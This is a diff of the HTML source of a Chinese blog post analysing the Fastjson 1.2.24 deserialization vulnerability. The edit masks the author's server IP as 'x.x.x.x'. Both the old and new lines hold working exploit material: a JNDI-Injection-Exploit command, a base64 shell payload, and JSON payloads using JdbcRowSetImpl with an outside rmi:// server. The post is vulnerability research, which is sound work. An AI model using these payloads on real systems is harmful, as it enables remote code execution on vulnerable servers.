@@ -13,7 +13,7 @@
 <meta property="og:site_name" content="Math &amp; Sec ，HACHp1的个人博客">
 <meta property="og:description" content="Fastjson 1.2.24反序列化漏洞浅析   Fastjson 1.2.24反序列化漏洞浅析  前言 概要 调试环境搭建 Fastjson初识 漏洞复现 利用过程跟踪  setXXX的触发过程 触发JNDI注入：JdbcRowSetImpl类的利用  总结 参考资料">
 <meta property="og:image" content="http://159.75.52.53/img/thumbnails/eggs.jpg">
-<meta property="og:updated_time" content="2022-03-25T09:20:01.197Z">
+<meta property="og:updated_time" content="2022-03-25T09:25:52.860Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Fastjson 1.2.24反序列化漏洞浅析">
 <meta name="twitter:description" content="Fastjson 1.2.24反序列化漏洞浅析   Fastjson 1.2.24反序列化漏洞浅析  前言 概要 调试环境搭建 Fastjson初识 漏洞复现 利用过程跟踪  setXXX的触发过程 触发JNDI注入：JdbcRowSetImpl类的利用  总结 参考资料">
@@ -294,12 +294,12 @@
 <p>应用存在一个根据请求发送的数据更新user对象属性的功能，该功能使用fastjson对请求数据进行解析：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@RequestMapping</span>(value = &#123; <span class="string">"/"</span> &#125;, method = &#123; RequestMethod.POST &#125;, produces = &#123; <span class="string">"application/json;charset=UTF-8"</span> &#125;)</div><div class="line">    <span class="meta">@ResponseBody</span></div><div class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">setUser</span><span class="params">(@RequestBody <span class="keyword">final</span> User user)</span> </span>&#123;</div><div class="line">        user.setAge(Integer.valueOf(<span class="number">20</span>));</div><div class="line">        <span class="keyword">return</span> user;</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
 <p>在这里选择 <code>JNDI-Injection-Exploit</code> 作为JNDI恶意服务端，尝试执行 <code>touch /tmp/hachp1</code> ：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;touch /tmp/hachp1&quot; -A &apos;159.75.52.53&apos;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;touch /tmp/hachp1&quot; -A &apos;x.x.x.x&apos;</div></pre></td></tr></table></figure>
 <p>因为没有bash，只有sh，不支持大括号的形式（ <code>{echo,dG91Y2ggL3RtcC9oYWNocDE=}|{base64,-d}|{bash,-i}</code> ）</p>
-<p>使用对应的url <code>rmi://159.75.52.53:1099/4fvkzz</code> 构造RMI payload：</p>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,<span class="attr">"dataSourceName"</span>:<span class="string">"rmi://159.75.52.53:1099/4fvkzz"</span>,<span class="attr">"autoCommit"</span>:<span class="literal">true</span>&#125;</div></pre></td></tr></table></figure>
+<p>使用对应的url <code>rmi://x.x.x.x:1099/4fvkzz</code> 构造RMI payload：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,<span class="attr">"dataSourceName"</span>:<span class="string">"rmi://x.x.x.x:1099/4fvkzz"</span>,<span class="attr">"autoCommit"</span>:<span class="literal">true</span>&#125;</div></pre></td></tr></table></figure>
 <p>构造完整payload：</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;"name":&#123;"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://159.75.52.53:1099/lxtcyl","autoCommit":true&#125;, "age":20&#125;&#125;</div></pre></td></tr></table></figure>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;"name":&#123;"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://x.x.x.x:1099/lxtcyl","autoCommit":true&#125;, "age":20&#125;&#125;</div></pre></td></tr></table></figure>
 <h2 id="利用过程跟踪">利用过程跟踪</h2>
 <h3 id="setxxx的触发过程">setXXX的触发过程</h3>
 <p>在此漏洞中，触发的是以“set”开头的被反序列化的对象的方法。</p>
@@ -335,7 +335,7 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">fieldDeser.setValue(object, fieldValue);</div></pre></td></tr></table></figure>
 <p>在 <code>FieldDeserializer#setValue:96,</code> 如果需要反序列化对应属性XXX，<strong>会调用之前获取到的“setXXX”方法</strong>：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">method.invoke(object, value);</div></pre></td></tr></table></figure>
-<p>再次回顾一下payload： <code>{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://159.75.52.53:1099/hzbsma&quot;,&quot;autoCommit&quot;:true}</code> ，可以注意到，在反序列化时会设置对象的 <code>autoCommit</code> 的属性，此时会调用其 <code>setAutoCommit</code> 方法。另外还有一个细节，我们把 <code>dataSourceName</code> 属性放到前面，是因为需要先给对象的 <code>dataSourceName</code> 赋值，fastjson按照字节一个一个的处理，所以在处理后面的 <code>setAutoCommit</code> 时，该属性已经被赋值了。</p>
+<p>再次回顾一下payload： <code>{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://x.x.x.x:1099/hzbsma&quot;,&quot;autoCommit&quot;:true}</code> ，可以注意到，在反序列化时会设置对象的 <code>autoCommit</code> 的属性，此时会调用其 <code>setAutoCommit</code> 方法。另外还有一个细节，我们把 <code>dataSourceName</code> 属性放到前面，是因为需要先给对象的 <code>dataSourceName</code> 赋值，fastjson按照字节一个一个的处理，所以在处理后面的 <code>setAutoCommit</code> 时，该属性已经被赋值了。</p>
 <p>到这里，fastjson的“setXXX”触发过程分析完毕。</p>
 <h3 id="触发jndi注入jdbcrowsetimpl类的利用">触发JNDI注入：JdbcRowSetImpl类的利用</h3>
 <p>下面我们再来看一下利用的触发JDNI注入的类，可以看到会使用 <code>dataSourceName</code> 属性作为参数，触发JNDI查询：</p>
